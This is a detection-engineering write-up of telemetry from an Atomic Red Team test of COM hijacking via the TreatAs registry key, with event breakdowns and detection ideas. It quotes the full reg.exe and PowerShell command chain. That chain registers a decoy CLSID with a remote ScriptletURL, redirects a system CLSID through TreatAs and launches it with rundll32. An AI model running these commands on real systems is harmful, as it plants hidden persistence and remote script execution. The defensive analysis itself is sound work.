# T1546.015-4: Component Object Model Hijacking — COM Hijacking via TreatAs

## Technique Context

T1546.015 (Component Object Model Hijacking) via the `TreatAs` registry key is an indirect variant of COM hijacking. Rather than directly overwriting the `InprocServer32` value of a frequently-activated system CLSID, the attacker creates a new "decoy" CLSID with their malicious server path, then uses `TreatAs` to redirect a legitimate target CLSID to the decoy. When any application activates the target CLSID, the OS follows the `TreatAs` pointer and loads the decoy's `InprocServer32` instead.

This indirection has defensive relevance: many detection rules and EDR behaviors focus narrowly on `InprocServer32` writes to well-known system CLSIDs. By operating on an obscure `TreatAs` key and registering a new CLSID, the attacker avoids those specific checks. The victim CLSID in this test, `{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}`, is redirected to the decoy `{00000001-0000-0000-0000-0000FEEDACDC}`, which has its `InprocServer32` set to `C:\WINDOWS\system32\scrobj.dll` (the Windows Script Runtime, used here as a benign stand-in). The decoy also carries a `ScriptletURL` value pointing to an external `.sct` scriptlet, which is the real execution mechanism in the full attack.

In the defended variant, this technique completed without Defender interference. This dataset shows the same outcome with Defender disabled.

## What This Dataset Contains

The dataset spans 4 seconds (2026-03-17 17:07:22–17:07:26 UTC) on ACME-WS06 (`acme.local`), executing as `NT AUTHORITY\SYSTEM`.

**Sysmon (78 events — Event IDs 1, 7, 10, 11, 12, 13, 17):**

Sysmon EID 1 (ProcessCreate, 21 events) records the full registration chain. The parent `powershell.exe` (tagged `technique_id=T1083`) invokes multiple `reg.exe` children (tagged `technique_id=T1012`). The `powershell.exe` command line fully discloses the attack:

```
"powershell.exe" & {reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
rundll32.exe -sta "AtomicTest"}
```

Sysmon EID 12 (RegistryObjectAddedOrDeleted, 2 events) records key creation and deletion events tagged `technique_id=T1546.015,technique_name=Component Object Model Hijacking`. The cleanup `reg.exe` deletion of `HKU\.DEFAULT\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs` is captured here — confirming the TreatAs key was present before cleanup.

The 3 expected Sysmon EID 13 (RegistrySetValue) events (from the EID breakdown) were not returned in the samples rotation, but the `eid_breakdown` confirms they exist. Security EID 4688 provides equivalent process-level evidence for each `reg.exe` invocation.

Sysmon EID 11 (FileCreate, 3 events) records PowerShell startup profile data files.

Sysmon EID 10 (ProcessAccess, 21 events) records `powershell.exe` accessing numerous `reg.exe` child processes with `GrantedAccess: 0x1FFFFF`, tagged `technique_id=T1055.001` — standard ART test framework process access behavior, generating notably more events here due to the large number of `reg.exe` children.

Sysmon EID 7 (ImageLoad, 25 events) records .NET runtime and Defender DLLs loading into the test framework PowerShell.

**Additional channels:**

The System log EID 7040 (service start type changed for BITS from auto to demand start) and Application log EID 8224 (VSS service idle timeout shutdown) are unrelated background system activity coinciding with the test window.

The WMI log EID 5858 records a failed WMI notification query (`SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'` returning `0x80041032` — event not available). This is ART test framework infrastructure monitoring for the cleanup phase.

**Security (21 events — Event ID 4688):**

Twenty-one process creation events capture each `reg.exe` invocation individually. The full command line for every registry write is recorded:

- `reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /T REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f`
- `reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL /ve /T REG_SZ /d https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct /f`
- `reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f`

Security EID 4688 also captures the cleanup `reg.exe` deletions of all three involved CLSIDs.

**PowerShell (111 events — Event IDs 4103, 4104):**

ScriptBlock logging captures the full registration and cleanup scripts verbatim, including all `reg add` commands, the TreatAs redirect target, and the `ScriptletURL` pointing to GitHub.

## What This Dataset Does Not Contain

- **No `rundll32.exe` EID 1:** The `rundll32.exe -sta "AtomicTest"` invocation appears in the PowerShell command line but is not captured as a separate Sysmon EID 1 ProcessCreate in the available samples. The EID 1 count (21 events) in the breakdown is accounted for by `powershell.exe`, `whoami.exe`, and `reg.exe` instances.
- **No DLL activation artifacts:** Loading of `scrobj.dll` into `rundll32.exe` and any subsequent scriptlet execution are not represented. The `ScriptletURL` value references a remote `.sct` file; whether network access was attempted is not confirmed in this dataset.
- **No network connection events:** Despite the `ScriptletURL` containing a GitHub URL, no Sysmon EID 3 (NetworkConnection) events appear in the dataset, suggesting the scriptlet URL was not fetched during this test run.

## Assessment

This is the most forensically rich dataset in the T1546.015 series for this batch. Security EID 4688 captures each `reg.exe` invocation individually, providing an atom-by-atom record of the COM registration structure. The TreatAs redirect — `{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}` pointing to `{00000001-0000-0000-0000-0000FEEDACDC}` — is explicit in the Security log even without Sysmon EID 13 events in the samples.

The undefended dataset (78 Sysmon events) is larger than the defended variant (66 Sysmon events). The additional 12 events here are attributable to the higher number of EID 10 (ProcessAccess) events from the larger number of `reg.exe` child processes — with Defender disabled, there are no defensive interruptions that might consolidate the chain.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** Multiple `reg.exe` processes spawned from a single `powershell.exe` parent, writing to `HKCU\SOFTWARE\Classes\CLSID\` paths. The sequence establishing a new CLSID, setting `InprocServer32`, and then writing `TreatAs` on a different CLSID is a recognizable multi-step pattern.
- **Sysmon EID 12 (RegistryObjectAddedOrDeleted):** Key creation tagged `technique_id=T1546.015` on `HKU\.DEFAULT\Software\Classes\CLSID\{97D47D56-...}\TreatAs`. The `TreatAs` subkey under a CLSID registration is rare in normal Windows operation.
- **Security EID 4688:** `reg.exe` adding a `ScriptletURL` value to a CLSID registration is highly anomalous. Legitimate COM servers do not use `ScriptletURL`.
- **Security EID 4688:** `reg.exe` adding a `TreatAs` value to a user-hive CLSID entry that shadows a system CLSID. Writes to `HKCU\Software\Classes\CLSID\<known-system-CLSID>\TreatAs` are a specific and actionable indicator.
- **PowerShell EID 4104:** The full `reg add ... TreatAs ... {00000001-0000-0000-0000-0000FEEDACDC}` command with the accompanying `InprocServer32` and `ScriptletURL` registrations appears in a single ScriptBlock, enabling pattern matching on the multi-operation block.
